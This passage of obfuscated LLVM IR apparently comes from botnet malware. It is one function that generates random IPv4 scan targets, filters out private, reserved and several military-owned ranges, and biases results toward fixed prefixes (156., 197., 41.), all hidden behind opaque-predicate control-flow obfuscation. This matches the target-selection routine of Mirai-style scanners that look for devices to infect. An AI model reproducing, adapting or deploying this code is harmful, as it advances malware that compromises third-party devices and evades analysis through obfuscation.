  %15 = alloca i32, align 4
  store i8 0, i8* %11, align 1
  store i8 0, i8* %12, align 1
  store i8 0, i8* %13, align 1
  store i8 0, i8* %14, align 1
  %16 = load i32, i32* @x.59
  %17 = load i32, i32* @y.60
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %24

; <label>:24:                                     ; preds = %421, %originalBBpart2
  %25 = load i32, i32* @x.59
  %26 = load i32, i32* @y.60
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %24
  %33 = call i32 @rand_next()
  store i32 %33, i32* %10, align 4
  %34 = call i64 @time(i64* null) #6
  %35 = trunc i64 %34 to i32
  call void @srand(i32 %35) #6
  %36 = load i32, i32* %10, align 4
  %37 = and i32 %36, 255
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %11, align 1
  %39 = load i32, i32* %10, align 4
  %40 = lshr i32 %39, 8
  %41 = and i32 %40, 255
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %12, align 1
  %43 = load i32, i32* %10, align 4
  %44 = lshr i32 %43, 16
  %45 = and i32 %44, 255
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %13, align 1
  %47 = load i32, i32* %10, align 4
  %48 = lshr i32 %47, 24
  %49 = and i32 %48, 255
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %14, align 1
  %51 = load i32, i32* @x.59
  %52 = load i32, i32* @y.60
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart224, label %originalBB1alteredBB

originalBBpart224:                                ; preds = %originalBB1
  br label %59

; <label>:59:                                     ; preds = %originalBBpart224
  %60 = load i8, i8* %11, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 127
  br i1 %62, label %421, label %63

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* @x.59
  %65 = load i32, i32* @y.60
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %63
  %72 = load i8, i8* %11, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 0
  %75 = load i32, i32* @x.59
  %76 = load i32, i32* @y.60
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %74, label %421, label %83

; <label>:83:                                     ; preds = %originalBBpart228
  %84 = load i32, i32* @x.59
  %85 = load i32, i32* @y.60
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %83
  %92 = load i8, i8* %11, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 3
  %95 = load i32, i32* @x.59
  %96 = load i32, i32* @y.60
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %94, label %421, label %103

; <label>:103:                                    ; preds = %originalBBpart232
  %104 = load i8, i8* %11, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 15
  br i1 %106, label %421, label %107

; <label>:107:                                    ; preds = %103
  %108 = load i32, i32* @x.59
  %109 = load i32, i32* @y.60
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %107
  %116 = load i8, i8* %11, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 16
  %119 = load i32, i32* @x.59
  %120 = load i32, i32* @y.60
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %118, label %421, label %127

; <label>:127:                                    ; preds = %originalBBpart236
  %128 = load i8, i8* %11, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 56
  br i1 %130, label %421, label %131

; <label>:131:                                    ; preds = %127
  %132 = load i32, i32* @x.59
  %133 = load i32, i32* @y.60
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %131
  %140 = load i8, i8* %11, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 10
  %143 = load i32, i32* @x.59
  %144 = load i32, i32* @y.60
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %142, label %421, label %151

; <label>:151:                                    ; preds = %originalBBpart240
  %152 = load i8, i8* %11, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 192
  br i1 %154, label %155, label %159

; <label>:155:                                    ; preds = %151
  %156 = load i8, i8* %12, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 168
  br i1 %158, label %421, label %159

; <label>:159:                                    ; preds = %155, %151
  %160 = load i8, i8* %11, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 172
  br i1 %162, label %163, label %187

; <label>:163:                                    ; preds = %159
  %164 = load i8, i8* %12, align 1
  %165 = zext i8 %164 to i32
  %166 = icmp sge i32 %165, 16
  br i1 %166, label %167, label %187

; <label>:167:                                    ; preds = %163
  %168 = load i32, i32* @x.59
  %169 = load i32, i32* @y.60
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %167
  %176 = load i8, i8* %12, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp slt i32 %177, 32
  %179 = load i32, i32* @x.59
  %180 = load i32, i32* @y.60
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %178, label %421, label %187

; <label>:187:                                    ; preds = %originalBBpart244, %163, %159
  %188 = load i8, i8* %11, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 100
  br i1 %190, label %191, label %215

; <label>:191:                                    ; preds = %187
  %192 = load i32, i32* @x.59
  %193 = load i32, i32* @y.60
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %191
  %200 = load i8, i8* %12, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp sge i32 %201, 64
  %203 = load i32, i32* @x.59
  %204 = load i32, i32* @y.60
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %202, label %211, label %215

; <label>:211:                                    ; preds = %originalBBpart248
  %212 = load i8, i8* %12, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp slt i32 %213, 127
  br i1 %214, label %421, label %215

; <label>:215:                                    ; preds = %211, %originalBBpart248, %187
  %216 = load i8, i8* %11, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp eq i32 %217, 169
  br i1 %218, label %219, label %239

; <label>:219:                                    ; preds = %215
  %220 = load i32, i32* @x.59
  %221 = load i32, i32* @y.60
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %219
  %228 = load i8, i8* %12, align 1
  %229 = zext i8 %228 to i32
  %230 = icmp sgt i32 %229, 254
  %231 = load i32, i32* @x.59
  %232 = load i32, i32* @y.60
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %230, label %421, label %239

; <label>:239:                                    ; preds = %originalBBpart252, %215
  %240 = load i8, i8* %11, align 1
  %241 = zext i8 %240 to i32
  %242 = icmp eq i32 %241, 198
  br i1 %242, label %243, label %267

; <label>:243:                                    ; preds = %239
  %244 = load i8, i8* %12, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp sge i32 %245, 18
  br i1 %246, label %247, label %267

; <label>:247:                                    ; preds = %243
  %248 = load i32, i32* @x.59
  %249 = load i32, i32* @y.60
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %247
  %256 = load i8, i8* %12, align 1
  %257 = zext i8 %256 to i32
  %258 = icmp slt i32 %257, 20
  %259 = load i32, i32* @x.59
  %260 = load i32, i32* @y.60
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %258, label %421, label %267

; <label>:267:                                    ; preds = %originalBBpart256, %243, %239
  %268 = load i8, i8* %11, align 1
  %269 = zext i8 %268 to i32
  %270 = icmp sge i32 %269, 224
  br i1 %270, label %421, label %271

; <label>:271:                                    ; preds = %267
  %272 = load i8, i8* %11, align 1
  %273 = zext i8 %272 to i32
  %274 = icmp eq i32 %273, 6
  br i1 %274, label %419, label %275

; <label>:275:                                    ; preds = %271
  %276 = load i32, i32* @x.59
  %277 = load i32, i32* @y.60
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %275
  %284 = load i8, i8* %11, align 1
  %285 = zext i8 %284 to i32
  %286 = icmp eq i32 %285, 7
  %287 = load i32, i32* @x.59
  %288 = load i32, i32* @y.60
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %286, label %419, label %295

; <label>:295:                                    ; preds = %originalBBpart260
  %296 = load i8, i8* %11, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp eq i32 %297, 11
  br i1 %298, label %419, label %299

; <label>:299:                                    ; preds = %295
  %300 = load i8, i8* %11, align 1
  %301 = zext i8 %300 to i32
  %302 = icmp eq i32 %301, 21
  br i1 %302, label %419, label %303

; <label>:303:                                    ; preds = %299
  %304 = load i8, i8* %11, align 1
  %305 = zext i8 %304 to i32
  %306 = icmp eq i32 %305, 22
  br i1 %306, label %419, label %307

; <label>:307:                                    ; preds = %303
  %308 = load i32, i32* @x.59
  %309 = load i32, i32* @y.60
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %307
  %316 = load i8, i8* %11, align 1
  %317 = zext i8 %316 to i32
  %318 = icmp eq i32 %317, 26
  %319 = load i32, i32* @x.59
  %320 = load i32, i32* @y.60
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %318, label %419, label %327

; <label>:327:                                    ; preds = %originalBBpart264
  %328 = load i32, i32* @x.59
  %329 = load i32, i32* @y.60
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %327
  %336 = load i8, i8* %11, align 1
  %337 = zext i8 %336 to i32
  %338 = icmp eq i32 %337, 28
  %339 = load i32, i32* @x.59
  %340 = load i32, i32* @y.60
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %338, label %419, label %347

; <label>:347:                                    ; preds = %originalBBpart268
  %348 = load i8, i8* %11, align 1
  %349 = zext i8 %348 to i32
  %350 = icmp eq i32 %349, 29
  br i1 %350, label %419, label %351

; <label>:351:                                    ; preds = %347
  %352 = load i8, i8* %11, align 1
  %353 = zext i8 %352 to i32
  %354 = icmp eq i32 %353, 30
  br i1 %354, label %419, label %355

; <label>:355:                                    ; preds = %351
  %356 = load i32, i32* @x.59
  %357 = load i32, i32* @y.60
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %355
  %364 = load i8, i8* %11, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp eq i32 %365, 33
  %367 = load i32, i32* @x.59
  %368 = load i32, i32* @y.60
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %366, label %419, label %375

; <label>:375:                                    ; preds = %originalBBpart272
  %376 = load i32, i32* @x.59
  %377 = load i32, i32* @y.60
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %375
  %384 = load i8, i8* %11, align 1
  %385 = zext i8 %384 to i32
  %386 = icmp eq i32 %385, 55
  %387 = load i32, i32* @x.59
  %388 = load i32, i32* @y.60
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %386, label %419, label %395

; <label>:395:                                    ; preds = %originalBBpart276
  %396 = load i32, i32* @x.59
  %397 = load i32, i32* @y.60
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %395
  %404 = load i8, i8* %11, align 1
  %405 = zext i8 %404 to i32
  %406 = icmp eq i32 %405, 214
  %407 = load i32, i32* @x.59
  %408 = load i32, i32* @y.60
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %406, label %419, label %415

; <label>:415:                                    ; preds = %originalBBpart280
  %416 = load i8, i8* %11, align 1
  %417 = zext i8 %416 to i32
  %418 = icmp eq i32 %417, 215
  br label %419

; <label>:419:                                    ; preds = %415, %originalBBpart280, %originalBBpart276, %originalBBpart272, %351, %347, %originalBBpart268, %originalBBpart264, %303, %299, %295, %originalBBpart260, %271
  %420 = phi i1 [ true, %originalBBpart280 ], [ true, %originalBBpart276 ], [ true, %originalBBpart272 ], [ true, %351 ], [ true, %347 ], [ true, %originalBBpart268 ], [ true, %originalBBpart264 ], [ true, %303 ], [ true, %299 ], [ true, %295 ], [ true, %originalBBpart260 ], [ true, %271 ], [ %418, %415 ]
  br label %421

; <label>:421:                                    ; preds = %419, %267, %originalBBpart256, %originalBBpart252, %211, %originalBBpart244, %155, %originalBBpart240, %127, %originalBBpart236, %103, %originalBBpart232, %originalBBpart228, %59
  %422 = phi i1 [ true, %267 ], [ true, %originalBBpart256 ], [ true, %originalBBpart252 ], [ true, %211 ], [ true, %originalBBpart244 ], [ true, %155 ], [ true, %originalBBpart240 ], [ true, %127 ], [ true, %originalBBpart236 ], [ true, %103 ], [ true, %originalBBpart232 ], [ true, %originalBBpart228 ], [ true, %59 ], [ %420, %419 ]
  br i1 %422, label %24, label %423

; <label>:423:                                    ; preds = %421
  %424 = call i32 @rand() #6
  %425 = srem i32 %424, 3
  store i32 %425, i32* %15, align 4
  %426 = load i32, i32* %15, align 4
  %427 = icmp eq i32 %426, 0
  br i1 %427, label %428, label %442

; <label>:428:                                    ; preds = %423
  %429 = load i8, i8* %12, align 1
  %430 = zext i8 %429 to i32
  %431 = shl i32 %430, 16
  %432 = or i32 -1677721600, %431
  %433 = load i8, i8* %13, align 1
  %434 = zext i8 %433 to i32
  %435 = shl i32 %434, 8
  %436 = or i32 %432, %435
  %437 = load i8, i8* %14, align 1
  %438 = zext i8 %437 to i32
  %439 = shl i32 %438, 0
  %440 = or i32 %436, %439
  %441 = call i32 @htonl(i32 %440) #9
  store i32 %441, i32* %9, align 4
  br label %544

; <label>:442:                                    ; preds = %423
  %443 = load i32, i32* @x.59
  %444 = load i32, i32* @y.60
  %445 = sub i32 %443, 1
  %446 = mul i32 %443, %445
  %447 = urem i32 %446, 2
  %448 = icmp eq i32 %447, 0
  %449 = icmp slt i32 %444, 10
  %450 = or i1 %448, %449
  br i1 %450, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %442
  %451 = load i32, i32* %15, align 4
  %452 = icmp eq i32 %451, 1
  %453 = load i32, i32* @x.59
  %454 = load i32, i32* @y.60
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %452, label %461, label %475

; <label>:461:                                    ; preds = %originalBBpart284
  %462 = load i8, i8* %12, align 1
  %463 = zext i8 %462 to i32
  %464 = shl i32 %463, 16
  %465 = or i32 -989855744, %464
  %466 = load i8, i8* %13, align 1
  %467 = zext i8 %466 to i32
  %468 = shl i32 %467, 8
  %469 = or i32 %465, %468
  %470 = load i8, i8* %14, align 1
  %471 = zext i8 %470 to i32
  %472 = shl i32 %471, 0
  %473 = or i32 %469, %472
  %474 = call i32 @htonl(i32 %473) #9
  store i32 %474, i32* %9, align 4
  br label %544

; <label>:475:                                    ; preds = %originalBBpart284
  %476 = load i32, i32* %15, align 4
  %477 = icmp eq i32 %476, 2
  br i1 %477, label %478, label %508

; <label>:478:                                    ; preds = %475
  %479 = load i32, i32* @x.59
  %480 = load i32, i32* @y.60
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %478
  %487 = load i8, i8* %12, align 1
  %488 = zext i8 %487 to i32
  %489 = shl i32 %488, 16
  %490 = or i32 687865856, %489
  %491 = load i8, i8* %13, align 1
  %492 = zext i8 %491 to i32
  %493 = shl i32 %492, 8
  %494 = or i32 %490, %493
  %495 = load i8, i8* %14, align 1
  %496 = zext i8 %495 to i32
  %497 = shl i32 %496, 0
  %498 = or i32 %494, %497
  %499 = call i32 @htonl(i32 %498) #9
  store i32 %499, i32* %9, align 4
  %500 = load i32, i32* @x.59
  %501 = load i32, i32* @y.60
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBBpart2130, label %originalBB86alteredBB

originalBBpart2130:                               ; preds = %originalBB86
  br label %544

; <label>:508:                                    ; preds = %475
  %509 = load i32, i32* @x.59
  %510 = load i32, i32* @y.60
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %508
  %517 = load i32, i32* %15, align 4
  %518 = icmp eq i32 %517, 3
  %519 = load i32, i32* @x.59
  %520 = load i32, i32* @y.60
  %521 = sub i32 %519, 1
  %522 = mul i32 %519, %521
  %523 = urem i32 %522, 2
  %524 = icmp eq i32 %523, 0
  %525 = icmp slt i32 %520, 10
  %526 = or i1 %524, %525
  br i1 %526, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br i1 %518, label %527, label %544

; <label>:527:                                    ; preds = %originalBBpart2134
  %528 = load i8, i8* %11, align 1
  %529 = zext i8 %528 to i32
  %530 = shl i32 %529, 24
  %531 = load i8, i8* %12, align 1
  %532 = zext i8 %531 to i32
  %533 = shl i32 %532, 16
  %534 = or i32 %530, %533
  %535 = load i8, i8* %13, align 1
  %536 = zext i8 %535 to i32
  %537 = shl i32 %536, 8
  %538 = or i32 %534, %537
  %539 = load i8, i8* %14, align 1
  %540 = zext i8 %539 to i32
  %541 = shl i32 %540, 0
  %542 = or i32 %538, %541
  %543 = call i32 @htonl(i32 %542) #9
  store i32 %543, i32* %9, align 4
  br label %544

; <label>:544:                                    ; preds = %527, %originalBBpart2134, %originalBBpart2130, %461, %428
  %545 = load i32, i32* @x.59
  %546 = load i32, i32* @y.60
  %547 = sub i32 %545, 1
  %548 = mul i32 %545, %547
  %549 = urem i32 %548, 2
  %550 = icmp eq i32 %549, 0
  %551 = icmp slt i32 %546, 10
  %552 = or i1 %550, %551
  br i1 %552, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %544
  %553 = load i32, i32* %9, align 4
  %554 = load i32, i32* @x.59
  %555 = load i32, i32* @y.60
  %556 = sub i32 %554, 1
  %557 = mul i32 %554, %556
  %558 = urem i32 %557, 2
  %559 = icmp eq i32 %558, 0
  %560 = icmp slt i32 %555, 10
  %561 = or i1 %559, %560
  br i1 %561, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  ret i32 %553

originalBBalteredBB:                              ; preds = %originalBB, %0
  %562 = alloca i32, align 4
  %563 = alloca i32, align 4
  %564 = alloca i8, align 1
  %565 = alloca i8, align 1
  %566 = alloca i8, align 1
  %567 = alloca i8, align 1
  %568 = alloca i32, align 4
  store i8 0, i8* %564, align 1
  store i8 0, i8* %565, align 1
  store i8 0, i8* %566, align 1
  store i8 0, i8* %567, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %24
  %569 = call i32 @rand_next()
  store i32 %569, i32* %10, align 4
  %570 = call i64 @time(i64* null) #6
  %571 = trunc i64 %570 to i32
  call void @srand(i32 %571) #6
  %572 = load i32, i32* %10, align 4
  %_ = shl i32 %572, 255
  %573 = and i32 %572, 255
  %574 = trunc i32 %573 to i8
  store i8 %574, i8* %11, align 1
  %575 = load i32, i32* %10, align 4
  %_2 = shl i32 %575, 8
  %_3 = sub i32 %575, 8
  %gen = mul i32 %_3, 8
  %576 = lshr i32 %575, 8
  %_4 = sub i32 %576, 255
  %gen5 = mul i32 %_4, 255
  %_6 = sub i32 0, %576
  %gen7 = add i32 %_6, 255
  %_8 = shl i32 %576, 255
  %_9 = sub i32 %576, 255
  %gen10 = mul i32 %_9, 255
  %_11 = sub i32 %576, 255
  %gen12 = mul i32 %_11, 255
  %577 = and i32 %576, 255
  %578 = trunc i32 %577 to i8
  store i8 %578, i8* %12, align 1
  %579 = load i32, i32* %10, align 4
  %_13 = shl i32 %579, 16
  %580 = lshr i32 %579, 16
  %_14 = shl i32 %580, 255
  %581 = and i32 %580, 255
  %582 = trunc i32 %581 to i8
  store i8 %582, i8* %13, align 1
  %583 = load i32, i32* %10, align 4
  %_15 = sub i32 %583, 24
  %gen16 = mul i32 %_15, 24
  %_17 = sub i32 0, %583
  %gen18 = add i32 %_17, 24
  %584 = lshr i32 %583, 24
  %_19 = sub i32 %584, 255
  %gen20 = mul i32 %_19, 255
  %_21 = sub i32 0, %584
  %gen22 = add i32 %_21, 255
  %585 = and i32 %584, 255
  %586 = trunc i32 %585 to i8
  store i8 %586, i8* %14, align 1
  br label %originalBB1

originalBB26alteredBB:                            ; preds = %originalBB26, %63
  %587 = load i8, i8* %11, align 1
  %588 = zext i8 %587 to i32
  %589 = icmp eq i32 %588, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %83
  %590 = load i8, i8* %11, align 1
  %591 = zext i8 %590 to i32
  %592 = icmp eq i32 %591, 3
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %107
  %593 = load i8, i8* %11, align 1
  %594 = zext i8 %593 to i32
  %595 = icmp eq i32 %594, 16
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %131
  %596 = load i8, i8* %11, align 1
  %597 = zext i8 %596 to i32
  %598 = icmp eq i32 %597, 10
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %167
  %599 = load i8, i8* %12, align 1
  %600 = zext i8 %599 to i32
  %601 = icmp slt i32 %600, 32
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %191
  %602 = load i8, i8* %12, align 1
  %603 = zext i8 %602 to i32
  %604 = icmp sge i32 %603, 64
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %219
  %605 = load i8, i8* %12, align 1
  %606 = zext i8 %605 to i32
  %607 = icmp sgt i32 %606, 254
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %247
  %608 = load i8, i8* %12, align 1
  %609 = zext i8 %608 to i32
